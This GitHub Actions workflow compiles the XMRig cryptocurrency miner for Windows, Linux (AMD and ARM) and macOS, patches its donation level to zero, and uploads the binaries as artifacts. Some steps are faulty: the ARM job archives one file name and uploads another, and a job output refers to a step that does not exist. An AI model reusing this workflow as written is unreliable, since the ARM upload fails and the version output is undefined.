name: Build
on:
  workflow_dispatch:

jobs:
  build_win:
    name: Build Windows artifacts
    runs-on: windows-2019
    steps:
      - name: Checkout Repository master branch
        uses: actions/checkout@v4

      - name: Checkout dependencies
        run: git clone https://github.com/xmrig/xmrig-deps.git

      - shell: powershell
        run: |
          (Get-Content src/donate.h) -replace 'DonateLevel = 1', 'DonateLevel = 0' | Set-Content src/donate.h

      - name: Build project on Windows
        run: |
          cmake . -G "MinGW Makefiles" -DXMRIG_DEPS=xmrig-deps\gcc\x64
          make -j2
          copy src\config.json .
          7z a -tzip -mx windows_build.zip xmrig.exe config.json
      - name: Upload Windows build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: windows_build
          path: windows_build.zip
    outputs:
      version: ${{ steps.version.outputs.version }}

  build_ubu20_04amd:
    name: Build Ubuntu 20.04 AMD artifacts
    runs-on: ubuntu-20.04
    steps:
      - name: Prepare Ubuntu tools
        run: |
          sudo apt update
          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
      - name: Checkout Repository master branch
        uses: actions/checkout@v2
        
      - name: Build project on Ubuntu
        run: |
          echo "XMRIG_VERSION="`cat src/version.h | grep -Eo "APP_VERSION\s+\"(.+?)\"" | awk -F "\"" '{print $2}'` >> $GITHUB_ENV
          sed -i 's/DonateLevel = 1/DonateLevel = 0/g' src/donate.h
          cmake .
          make -j$(nproc)
          cp src/config.json .
          tar cfz ubuntu20.04_buildamd.tar.gz xmrig config.json

      - name: Upload Ubuntu build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: ubuntu20.04_buildamd
          path: ubuntu20.04_buildamd.tar.gz

  build_linamd:
    name: Build Linux AMD artifacts
    runs-on: ubuntu-22.04
    steps:
      - name: Prepare Ubuntu tools
        run: |
          sudo apt update
          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
      - name: Checkout Repository master branch
        uses: actions/checkout@v2
        
      - name: Build project on Ubuntu
        run: |
          echo "XMRIG_VERSION="`cat src/version.h | grep -Eo "APP_VERSION\s+\"(.+?)\"" | awk -F "\"" '{print $2}'` >> $GITHUB_ENV
          sed -i 's/DonateLevel = 1/DonateLevel = 0/g' src/donate.h
          cmake .
          make -j$(nproc)
          cp src/config.json .
          tar cfz ubuntu_buildamd.tar.gz xmrig config.json

      - name: Upload Ubuntu build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: ubuntu_buildamd
          path: ubuntu_buildamd.tar.gz

  build_linarm:
    name: Build Linux ARM artifacts
    runs-on: ubuntu-22.04-arm
    steps:
      - name: Prepare Ubuntu tools
        run: |
          sudo apt update
          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
      - name: Checkout Repository master branch
        uses: actions/checkout@v2
        
      - name: Build project on Ubuntu
        run: |
          echo "XMRIG_VERSION="`cat src/version.h | grep -Eo "APP_VERSION\s+\"(.+?)\"" | awk -F "\"" '{print $2}'` >> $GITHUB_ENV
          sed -i 's/DonateLevel = 1/DonateLevel = 0/g' src/donate.h
          cmake .
          make -j$(nproc)
          cp src/config.json .
          tar cfz ubuntu_buildamd.tar.gz xmrig config.json

      - name: Upload Ubuntu build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: ubuntu_buildarm
          path: ubuntu_buildarm.tar.gz
    
  build_macos:
    name: Build MacOS artifacts
    runs-on: macos-latest
    steps:
      - name: Prepare MacOS tools
        run: |
          brew install cmake libuv openssl hwloc
      - name: Checkout Repository master branch
        uses: actions/checkout@v2

      - name: Build hwloc on MacOS
        run: |
          curl -O https://download.open-mpi.org/release/hwloc/v2.1/hwloc-2.1.0.tar.bz2
          tar xjf hwloc-2.1.0.tar.bz2
          cd hwloc-2.1.0
          ./configure --disable-shared --enable-static --disable-io --disable-libxml2
          make -j$(sysctl -n hw.logicalcpu)
          cd ..
      - name: Build project on MacOS
        run: |
          sed -i '' 's/DonateLevel = 1/DonateLevel = 0/g' src/donate.h
          echo "XMRIG_VERSION="`cat src/version.h | grep -Eo "APP_VERSION\s+\"(.+?)\"" | awk -F "\"" '{print $2}'` >> $GITHUB_ENV
          cmake . -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl -DHWLOC_INCLUDE_DIR=hwloc-2.1.0/include -DHWLOC_LIBRARY=hwloc-2.1.0/hwloc/.libs/libhwloc.a
          make -j$(sysctl -n hw.logicalcpu)
          cp src/config.json .
          tar cfz macos_build.tar.gz xmrig config.json
      - name: Upload MacOS build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: macos_build
          path: macos_build.tar.gz
